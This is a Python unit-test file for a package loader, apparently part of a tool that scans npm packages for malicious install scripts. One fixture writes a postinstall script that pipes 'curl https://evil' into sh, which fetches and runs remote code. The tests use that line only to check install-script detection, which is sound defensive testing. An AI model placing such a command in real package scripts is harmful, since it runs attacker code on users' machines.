from __future__ import annotations

import json
import tarfile
import tempfile
import unittest
from pathlib import Path

from socketai_reproduce.package_loader import load_package


class PackageLoaderTests(unittest.TestCase):
    def test_load_directory_input_and_install_scripts(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "pkg"
            scripts_dir = root / "scripts"
            scripts_dir.mkdir(parents=True)
            (root / "package.json").write_text(
                json.dumps(
                    {
                        "name": "demo-package",
                        "version": "1.0.0",
                        "scripts": {"postinstall": "node ./scripts/postinstall.js"},
                    }
                ),
                encoding="utf-8",
            )
            (root / "index.js").write_text("console.log('ok')\n", encoding="utf-8")
            (scripts_dir / "postinstall.js").write_text(
                "require('child_process').exec('curl https://evil | sh')\n",
                encoding="utf-8",
            )

            loaded = load_package(root, Path(tmp) / "scratch")

            self.assertEqual(loaded.package_name, "demo-package")
            self.assertEqual(loaded.package_version, "1.0.0")
            self.assertEqual(len(loaded.install_script_files), 1)
            self.assertEqual(
                loaded.relative_path(loaded.install_script_files[0]),
                "scripts/postinstall.js",
            )
            candidate_paths = [loaded.relative_path(path) for path in loaded.base_candidate_files]
            self.assertIn("package.json", candidate_paths)
            self.assertIn("scripts/postinstall.js", candidate_paths)

    def test_load_archive_input(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp) / "source"
            package_dir = root / "package"
            package_dir.mkdir(parents=True)
            (package_dir / "package.json").write_text(
                json.dumps({"name": "archive-demo", "version": "2.0.0"}),
                encoding="utf-8",
            )
            (package_dir / "index.js").write_text("console.log('archive')\n", encoding="utf-8")

            archive_path = Path(tmp) / "archive-demo.tgz"
            with tarfile.open(archive_path, "w:gz") as archive:
                archive.add(package_dir, arcname="package")

            loaded = load_package(archive_path, Path(tmp) / "scratch")

            self.assertTrue(loaded.is_archive)
            self.assertEqual(loaded.package_name, "archive-demo")
            self.assertTrue((loaded.package_root / "package.json").exists())


if __name__ == "__main__":
    unittest.main()
